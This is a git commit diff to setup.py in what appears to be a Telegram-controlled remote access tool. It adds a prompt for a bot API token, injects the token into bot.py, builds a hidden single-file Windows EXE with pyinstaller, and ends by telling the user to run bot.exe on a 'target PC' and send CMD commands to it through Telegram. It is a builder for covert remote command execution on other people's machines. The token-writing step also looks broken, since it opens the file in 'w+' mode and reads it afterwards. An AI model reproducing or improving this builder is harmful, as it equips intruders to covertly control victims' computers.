2b62b3db31da4f0c9d610d5699cf30bc2b674639
Artem <79601745+Sovenok-Hacker@users.noreply.github.com>
2022-06-29 14:50:23 +0000

    Update setup.py

--- setup.py
+++ setup.py
@@ -1,11 +1,17 @@
 import os
 os.system('pip install -r requirements.txt')
 icon = input('Use default file icon or your own icon (D for default, path to file for use your local icon):')
+token = input('Telegram Bot API token: ')
 if icon == 'D' or icon == '':
     icon = "bot.ico"
 else:
   icon = icon
+with open('bot.py', 'w+') as file:
+    file.write(file.read().replace('<token>', token))
 print('Building EXE file...')
-os.system(f'pyinstaller --icon {icon} -w --onefile bot.py')
-os.rename('dist/bot.exe', 'bot.exe')
-print('Run bot.exe on target PC and send CMD commands to your telegram bot')
+try:
+    assert os.system(f'pyinstaller --icon {icon} -w --onefile bot.py') == 0
+    os.rename('dist/bot.exe', 'bot.exe')
+    print('Run bot.exe on target PC and send CMD commands to your telegram bot!')
+except:
+    print('Error while creating EXE file.')
